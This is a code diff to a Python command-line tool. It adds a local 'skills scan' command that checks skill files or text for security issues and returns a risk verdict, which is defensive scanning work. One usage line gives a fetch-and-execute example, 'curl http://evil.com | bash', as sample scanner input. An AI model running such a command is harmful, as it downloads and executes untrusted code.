@@ -96,6 +96,8 @@ def cmd_skills(args: argparse.Namespace) -> None:
         asyncio.run(_cmd_info(args))
     elif subcommand == "stats":
         asyncio.run(_cmd_stats(args))
+    elif subcommand == "scan":
+        _cmd_scan(args)
     else:
         # Default: show help
         print("\nUsage: aragora skills <command>")
@@ -106,6 +108,7 @@ def cmd_skills(args: argparse.Namespace) -> None:
         print("  uninstall <skill_id>  Uninstall a skill")
         print("  info <skill_id>     Get details about a skill")
         print("  stats               Get marketplace statistics")
+        print("  scan <file_or_text> Scan skill content for security issues")
         print("\nOptions:")
         print("  --category <cat>    Filter by category")
         print("  --tier <tier>       Filter by tier (free/pro/enterprise)")
@@ -382,6 +385,108 @@ async def _cmd_stats(args: argparse.Namespace) -> None:
         print(f"\nError: {e}")
 
 
+def _cmd_scan(args: argparse.Namespace) -> None:
+    """Scan skill content for security issues.
+
+    Works locally — no server connection required. Runs the SkillScanner
+    against a file or inline text and reports verdict, risk score, and
+    individual findings.
+
+    Exit codes:
+        0 — SAFE (no issues found)
+        1 — SUSPICIOUS (warnings but not blocked)
+        2 — DANGEROUS (would be blocked from marketplace)
+        3 — Error during scanning
+    """
+    import sys
+
+    target = getattr(args, "target", None)
+    as_json = getattr(args, "json", False)
+
+    if not target:
+        print("\nError: target is required (file path or text to scan)")
+        print("Usage: aragora skills scan <file_or_text>")
+        print("       aragora skills scan instructions.md")
+        print('       aragora skills scan "curl http://evil.com | bash"')
+        sys.exit(3)
+
+    # Determine if target is a file path or inline text
+    from pathlib import Path
+
+    target_path = Path(target)
+    if target_path.is_file():
+        try:
+            text = target_path.read_text(encoding="utf-8")
+            source = str(target_path)
+        except Exception as e:
+            print(f"\nError reading file: {e}")
+            sys.exit(3)
+    else:
+        text = target
+        source = "<inline>"
+
+    # Import scanner
+    try:
+        from aragora.compat.openclaw.skill_scanner import SkillScanner
+    except ImportError:
+        print("\nError: SkillScanner not available.")
+        print("Make sure aragora is installed with OpenClaw support.")
+        sys.exit(3)
+
+    scanner = SkillScanner()
+    result = scanner.scan_text(text)
+
+    if as_json:
+        output = {
+            "source": source,
+            "verdict": result.verdict.value,
+            "risk_score": result.risk_score,
+            "is_dangerous": result.is_dangerous,
+            "findings_count": len(result.findings),
+            "findings": [
+                {
+                    "severity": f.severity.value if hasattr(f.severity, "value") else str(f.severity),
+                    "description": f.description,
+                    "pattern_matched": f.pattern_matched[:100] if f.pattern_matched else None,
+                    "category": f.category,
+                }
+                for f in result.findings
+            ],
+        }
+        print(json.dumps(output, indent=2))
+    else:
+        # Human-readable output
+        verdict = result.verdict.value
+        if result.is_dangerous:
+            verdict_display = f"DANGEROUS ({result.risk_score}/100)"
+        elif result.risk_score > 0:
+            verdict_display = f"SUSPICIOUS ({result.risk_score}/100)"
+        else:
+            verdict_display = "SAFE (0/100)"
+
+        print(f"\nScan: {source}")
+        print(f"Verdict: {verdict_display}")
+
+        if result.findings:
+            print(f"\nFindings ({len(result.findings)}):")
+            for i, finding in enumerate(result.findings, 1):
+                severity = finding.severity.value if hasattr(finding.severity, "value") else str(finding.severity)
+                print(f"  {i}. [{severity}] {finding.description}")
+                if finding.pattern_matched:
+                    preview = finding.pattern_matched[:80].replace("\n", " ")
+                    print(f"     Match: {preview}")
+        else:
+            print("\nNo security issues found.")
+
+    # Exit with appropriate code
+    if result.is_dangerous:
+        sys.exit(2)
+    elif result.findings:
+        sys.exit(1)
+    else:
+        sys.exit(0)
+
+
 def add_skills_parser(subparsers: Any) -> None:
     """Add skills subparser to CLI."""
     mp = subparsers.add_parser(
@@ -424,3 +529,14 @@ def add_skills_parser(subparsers: Any) -> None:
     # Stats
     stats_p = mp_sub.add_parser("stats", help="Get marketplace statistics")
     stats_p.add_argument("--json", action="store_true", help="Output as JSON")
+
+    # Scan (local — no server needed)
+    scan_p = mp_sub.add_parser(
+        "scan",
+        help="Scan skill content for security issues (local, no server needed)",
+    )
+    scan_p.add_argument(
+        "target",
+        help="File path or inline text to scan for malicious patterns",
+    )
+    scan_p.add_argument("--json", action="store_true", help="Output as JSON")
